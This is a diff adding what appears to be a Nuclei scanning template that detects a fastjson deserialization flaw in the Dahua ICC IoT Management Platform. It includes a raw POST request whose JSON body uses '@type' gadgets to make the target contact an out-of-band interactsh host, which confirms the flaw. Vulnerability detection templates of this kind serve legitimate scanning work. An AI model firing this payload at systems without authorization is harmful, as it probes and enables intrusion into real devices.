@@ -1,0 +1,32 @@
+id: dahua-icc-random-unserialize
+info:
+  name: Dahua ICC IoT Management Platform Random Unserialize Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "a":{
+            "@type":"com.alibaba.fastjson.JSONObject",
+            {"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
+          }""
+        }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":false"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
